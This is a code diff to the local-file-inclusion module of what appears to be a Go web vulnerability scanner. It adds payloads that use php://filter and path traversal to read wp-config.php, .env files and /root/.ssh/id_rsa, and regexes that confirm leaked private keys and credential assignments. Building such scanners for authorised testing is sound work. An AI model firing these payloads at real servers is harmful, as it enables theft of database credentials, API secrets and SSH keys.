@@ -84,6 +84,26 @@ var lfiPayloads = []string{
 	// it" read primitive while evading a base64-keyword filter.
 	"php://filter/string.rot13/resource=index.php",
 	"php://filter/convert.quoted-printable-encode/resource=index.php",
+	// High-value source/secret disclosure via php://filter base64. Reading these
+	// through a vulnerable include leaks DB credentials, framework secret keys and
+	// API tokens — the LFI finding a hunter actually reports. Confirmed by decoding
+	// the base64 and matching PHP source OR a high-signal secret assignment
+	// (confirmLFI), so a missing file / error page yields nothing. Relative
+	// resources (no leading /) because php://filter resolves them from the script's
+	// own directory, where these configs usually live.
+	"php://filter/convert.base64-encode/resource=wp-config.php",
+	"php://filter/convert.base64-encode/resource=../wp-config.php",
+	"php://filter/convert.base64-encode/resource=config.php",
+	"php://filter/convert.base64-encode/resource=configuration.php",
+	"php://filter/convert.base64-encode/resource=config/database.php",
+	"php://filter/convert.base64-encode/resource=app/etc/env.php",
+	"php://filter/convert.base64-encode/resource=.env",
+	"php://filter/convert.base64-encode/resource=../.env",
+	// Direct secret-file reads via plain traversal (no PHP wrapper needed — any
+	// language's file-read sink). SSH keys and framework dotenv files.
+	"../../../../../../../../root/.ssh/id_rsa",
+	"../../../../../../../../var/www/.env",
+	"../../../../../../../../var/www/html/.env",
 }
 
 // lfiLogPaths are common web-server log locations that, if included through a
@@ -120,6 +140,14 @@ var (
 	// not newline-separated — [\s\S]* (not [^\x00]*) must cross that NUL byte.
 	reProcEnviron = regexp.MustCompile(`PATH=[\s\S]*HTTP_USER_AGENT=`)
 	reExpectID    = regexp.MustCompile(`uid=\d+\([\w-]+\)\s+gid=\d+`)
+	// A PEM private-key header is a near-zero-FP signal that a file-read sink
+	// returned an SSH/TLS private key.
+	reSSHKey = regexp.MustCompile(`-----BEGIN (?:RSA |OPENSSH |EC |DSA |PGP )?PRIVATE KEY-----`)
+	// High-signal secret assignments found when a dotenv / framework config file
+	// is read. Deliberately anchored to credential keys (not a generic KEY=VALUE)
+	// so it only fires on genuine secret material, and only ever checked against a
+	// php://filter-decoded body (never arbitrary page text) — see confirmLFI.
+	reSecretCfg = regexp.MustCompile(`(?mi)^\s*(?:export\s+)?(DB_PASSWORD|DB_PASS|DATABASE_URL|APP_KEY|APP_SECRET|SECRET_KEY|JWT_SECRET|AWS_SECRET_ACCESS_KEY|STRIPE_SECRET)\s*[:=]`)
 )
 
 const lfiMaxParams = 150
@@ -279,6 +307,18 @@ func confirmLFI(payload, body string) string {
 	if strings.Contains(payload, "proc/self/environ") && reProcEnviron.MatchString(body) {
 		return "/proc/self/environ"
 	}
+	// A PEM private-key header in the response is near-zero-FP proof that a
+	// file-read sink returned an SSH/TLS private key (the differential + double
+	// reproduce + control-absent checks in Run() guard the rest).
+	if reSSHKey.MatchString(body) {
+		return "private key file read"
+	}
+	// A dotenv read returns the raw KEY=VALUE secrets. Only trust the high-signal
+	// credential-key match when WE deliberately targeted a .env path, so an
+	// ordinary page that happens to contain such text can never trip it.
+	if strings.Contains(payload, ".env") && reSecretCfg.MatchString(body) {
+		return "dotenv secret disclosure"
+	}
 	// data:// wrapper — our own unique marker echoed back means the app
 	// require()/include()d the raw payload as executable PHP.
 	if strings.HasPrefix(payload, "data://") && strings.Contains(body, "rcnLFI_"+lfiMarker) {
@@ -296,6 +336,12 @@ func confirmLFI(payload, body string) string {
 				d := string(dec)
 				if strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
 					return "php://filter base64 source disclosure"
+				}
+				if reSecretCfg.MatchString(d) {
+					return "php://filter base64 secret-config disclosure"
+				}
+				if reSSHKey.MatchString(d) {
+					return "php://filter base64 private key disclosure"
 				}
 			}
 		}
